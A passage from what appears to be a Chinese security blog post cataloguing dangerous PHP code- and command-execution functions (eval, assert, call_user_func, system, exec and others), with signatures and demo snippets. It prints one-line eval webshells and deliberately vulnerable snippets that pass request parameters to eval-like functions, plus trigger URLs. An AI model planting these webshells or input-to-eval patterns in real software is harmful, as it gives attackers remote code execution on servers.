punctuation\">[</span><span class=\"token punctuation\">,</span> int <span class=\"token operator\">&amp;</span><span class=\"token variable\">$count</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> mixed<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以     <code>replacement</code> 进行替换。当使用被启用的e修饰符时，这个函数会转义一些字符（即：‘、”、\\和NULL）然后进行后向引用替换。在完成替换后，引擎会将结果字符串作为PHP代码<strong>使用eval方式进行评估</strong>并将返回值作为最终参与替换的字符串</p>\n</li>\n</ul>\n</li>\n<li><p>call_user_func()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span> \n    callable <span class=\"token variable\">$callback</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> mixed <span class=\"token variable\">$parameter</span>\n     <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> mixed $<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> mixed<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?a=assert&amp;b=phpinfo()</code></pre></li>\n</ul>\n</li>\n<li><p>call_user_func_array()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span> \n    callable <span class=\"token variable\">$callback</span><span class=\"token punctuation\">,</span> \n    <span class=\"token keyword\">array</span> <span class=\"token variable\">$param_arr</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> mixed<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?a=assert&amp;b[]=phpinfo()</code></pre></li>\n</ul>\n</li>\n<li><p>create_function</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span>\n    string <span class=\"token variable\">$args</span><span class=\"token punctuation\">,</span>\n    string <span class=\"token variable\">$code</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> string<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'kk'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string\">'$a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"echo $a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?kk=phpinfo();</code></pre></li>\n</ul>\n</li>\n<li><p>array_map()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span> \n    callable <span class=\"token variable\">$callback</span><span class=\"token punctuation\">,</span> \n    <span class=\"token keyword\">array</span> <span class=\"token variable\">$array1</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span> $<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword\">array</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token variable\">$array</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'kk'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?kk=phpinfo</code></pre><p>注意没有<code>()</code>和分号<code>;</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"系统命令执行相关\"><a href=\"#系统命令执行相关\" class=\"headerlink\" title=\"系统命令执行相关\"></a>系统命令执行相关</h2><ul>\n<li><p>system()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">system</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$command</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> int <span class=\"token operator\">&amp;</span><span class=\"token variable\">$return_var</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> string<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>command是要执行的命令。return_var，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>            \n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>passthru()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$command</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> int <span class=\"token operator\">&amp;</span><span class=\"token variable\">$return_var</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> void<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>同 <code>exec()</code>函数类似，<strong><code>passthru()</code></strong> 函数也是用来执行外部命令（<code>command</code>）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代<code>exec()</code>或 <code>system()</code>函数。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>exec()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$command</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$output</span>\n     <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> int <span class=\"token operator\">&amp;</span><span class=\"token variable\">$return_var</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> string<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><strong>exec()</strong> 执行<code>command</code>参数所指定的命令。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>pcntl_exec()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">pcntl_exec</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$path</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span> <span class=\"token variable\">$args</span>\n     <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span> <span class=\"token variable\">$envs</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> void<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><code>path</code>是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本。</p>\n<p><code>args</code>是一个要传递给程序的参数的字符串数组。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token function\">pcntl_exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>shell_exec()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> string <span class=\"token variable\">$cmd</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> string<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>cmd是要执行的命令</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>popen()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">popen</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> \n    string <span class=\"token variable\">$mode</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> resource<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>打开一个指向进程的管道，该进程由派生给定的 <code>command</code> 命令执行而产生。后面的<code>mode</code>，当为’r’时，返回的文件指针等于命令的STDOUT，当为‘w’时,返回的文件指针等于命令的STDIN。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token variable\">$handle</span><span class=\"token operator\">=</span><span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/ls\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>proc_open()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span> \n    <span class=\"token keyword\">array</span> <span class=\"token variable\">$descriptorspec</span><span class=\"token punctuation\">,</span> \n    <span class=\"token keyword\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$pipes</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span>string <span class=\"token variable\">$cwd</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">NULL</span>\n     <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span> <span class=\"token variable\">$env</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">NULL</span>\n      <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span> <span class=\"token variable\">$other_options</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">NULL</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> resource<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>类似 <a href=\"mk:@MSITStore:C:\\Users\\10429\\Desktop\\php_enhanced_zh.chm::/res/function.popen.html\">popen()</a> 函数，但是 <strong>proc_open()</strong> 提供了更加强大的控制程序执行的能力。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>`</strong>(反引号)</p>\n<ul>\n<li><p>在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数shell_exec()相同）。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token keyword\">echo</span> `whoami`<span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n<li><p>ob_start()</p>\n<ul>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">[</span> callback <span class=\"token variable\">$output_callback</span>\n     <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> int <span class=\"token variable\">$chunk_size</span>\n      <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> bool <span class=\"token variable\">$erase</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> bool<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p>\n<p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被(  ob_flush(), ob_clean()  或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用  output_callback 时，它将收到输出缓冲区的内容作为参数  并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p>\n<p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(<em>c<strong>m</strong>d</em>)中的<em>c<strong>m</strong>d</em>，把我们输入的_GET[a]作为cmd的参数。</p>\n</li>\n<li><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"$_GET['a']\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?a=whoami</code></pre></li>\n</ul>\n</li>\n<li><p>php mail()</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">mail</span><span class=\"token punctuation\">(</span> \n    string <span class=\"token variable\">$to</span><span class=\"token punctuation\">,</span> \n    string <span class=\"token variable\">$subject</span><span class=\"token punctuation\">,</span> \n    string <span class=\"token variable\">$message</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> string <span class=\"token variable\">$additional_headers</span>\n    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> string <span class=\"token variable\">$additional_parameters</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> bool<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项</p>\n<ul>\n<li>配置SMTP服务器的主机名和端口</li>\n<li>配置PHP用作邮件传输代理(MTA)的文件路径</li>\n</ul>\n<p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p>\n</li>\n</ul>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"php代码-命令执行漏洞常见危险函数\"><a href=\"#php代码-命令执行漏洞常见危险函数\" class=\"headerlink\" title=\"php代码/命令执行漏洞常见危险函数\"></a>php代码/命令执行漏洞常见危险函数</h1><h3 id=\"php代码执行相关\"><a href=\"#php代码执行相关\" class=\"headerlink\" title=\"php代码执行相关\"></a>php代码执行相关</h3><blockquote>\n<p>参考<a href=\"https://www.php.net/manual/zh/index.php\" target=\"_blank\" rel=\"noopener\">php手册</a></p>\n</blockquote>\n<ul>\n<li><p>eval()</p>\n<ul>\n<li><p>说明</p>\n<pre><code class=\"php\">eval(string $code):mixed</code></pre>\n</li>\n<li><p>将字符串<code>$code</code>作为php代码执行。常见的一句话木马：</p>\n<pre><code class=\"php\">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\n&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;\n&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></pre>\n</li>\n<li><p>所有的语句必须以分号结尾</p>\n</li>\n<li><p>可以用合适的PHP tag来离开、重新进入PHP模式</p>\n<pre><code class=\"php\">&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#39;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>assert()</p>\n<ul>\n<li><p>php5</p>\n<pre><code class=\"php\">assert( mixed $assertion[, string $description] ) : bool</code></pre>\n</li>\n<li><p>php7</p>\n<pre><code class=\"php\">assert( mixed $assertion[, Throwable $exception] ) : bool</code></pre>\n</li>\n<li><pre><code class=\"php\">&lt;?php assert($_GET[&#39;pass&#39;]);?&gt;</code></pre>\n<pre><code>http://localhost/demo.php?pass=phpinfo()</code></pre><p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>\n</li>\n</ul>\n</li>\n<li><p>preg_replace</p>\n<ul>\n<li><pre><code class=\"php\">preg_replace( \n    mixed $pattern, \n    mixed $replacement, \n    mixed $subject\n    [, int $limit = -1\n     [, int &amp;$count]] \n) : mixed</code></pre>\n</li>\n<li><p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以     <code>replacement</code> 进行替换。当使用被启用的e修饰符时，这个函数会转义一些字符（即：‘、”、\\和NULL）然后进行后向引用替换。在完成替换后，引擎会将结果字符串作为PHP代码<strong>使用eval方式进行评估</strong>并将返回值作为最终参与替换的字符串</p>\n</li>\n</ul>\n</li>\n<li><p>call_user_func()</p>\n<ul>\n<li><pre><code class=\"php\">call_user_func( \n    callable $callback\n    [, mixed $parameter\n     [, mixed $...]] \n) : mixed</code></pre>\n</li>\n<li><p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php call_user_func($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);?&gt;</code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?a=assert&amp;b=phpinfo()</code></pre></li>\n</ul>\n</li>\n<li><p>call_user_func_array()</p>\n<ul>\n<li><pre><code class=\"php\">call_user_func_array( \n    callable $callback, \n    array $param_arr\n) : mixed</code></pre>\n</li>\n<li><p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    call_user_func_array($_GET[a],$_GET[&#39;b&#39;]);\n?&gt;</code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?a=assert&amp;b[]=phpinfo()</code></pre></li>\n</ul>\n</li>\n<li><p>create_function</p>\n<ul>\n<li><pre><code class=\"php\">create_function(\n    string $args,\n    string $code\n) : string</code></pre>\n</li>\n<li><p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    $a=$_GET[&#39;kk&#39;];\n    $b=create_function(&#39;$a&#39;,&quot;echo $a&quot;);\n    $b(&#39;&#39;);\n?&gt;</code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?kk=phpinfo();</code></pre></li>\n</ul>\n</li>\n<li><p>array_map()</p>\n<ul>\n<li><pre><code class=\"php\">array_map( \n    callable $callback, \n    array $array1\n    [, array $...] \n) : array</code></pre>\n</li>\n<li><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    $array=array(0,1,2,3,4,5);\n    array_map($_GET[&#39;kk&#39;],$array);\n?&gt;</code></pre>\n<p>访问</p>\n<pre><code>http://localhost/demo.php?kk=phpinfo</code></pre><p>注意没有<code>()</code>和分号<code>;</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"系统命令执行相关\"><a href=\"#系统命令执行相关\" class=\"headerlink\" title=\"系统命令执行相关\"></a>系统命令执行相关</h2><ul>\n<li><p>system()</p>\n<ul>\n<li><pre><code class=\"php\">system( \n    string $command\n    [, int &amp;$return_var] \n) : string</code></pre>\n</li>\n<li><p>command是要执行的命令。return_var，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php            \n    system(&quot;whoami&quot;);\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>passthru()</p>\n<ul>\n<li><pre><code class=\"php\">passthru( \n    string $command\n    [, int &amp;$return_var] \n) : void</code></pre>\n</li>\n<li><p>同 <code>exec()</code>函数类似，<strong><code>passthru()</code></strong> 函数也是用来执行外部命令（<code>command</code>）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代<code>exec()</code>或 <code>system()</code>函数。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    passthru(&quot;whoami&quot;);\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>exec()</p>\n<ul>\n<li><pre><code class=\"php\">exec( \n    string $command\n    [, array &amp;$output\n     [, int &amp;$return_var]] \n) : string</code></pre>\n</li>\n<li><p><strong>exec()</strong> 执行<code>command</code>参数所指定的命令。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    echo exec(&quot;whoami&quot;);\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>pcntl_exec()</p>\n<ul>\n<li><pre><code class=\"php\">pcntl_exec( \n    string $path\n    [, array $args\n     [, array $envs]] \n) : void</code></pre>\n</li>\n<li><p><code>path</code>是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本。</p>\n<p><code>args</code>是一个要传递给程序的参数的字符串数组。</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    pcntl_exec(&quot;/bin/bash&quot;,array(&quot;whoami&quot;));\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>shell_exec()</p>\n<ul>\n<li><pre><code class=\"php\">shell_exec( string $cmd ) : string</code></pre>\n</li>\n<li><p>cmd是要执行的命令</p>\n</li>\n<li><pre><code class=\"php\">&lt;?php\n    echo shell_exec(&quot;whoami&quot;);\n?&gt;</code></pre>\n</li>\n</ul>\n</li>\n<li><p>popen()</p>\n<ul>\n<li><pre><code class=\"php\">popen( \n    string $command, \n    string $mode\n) : 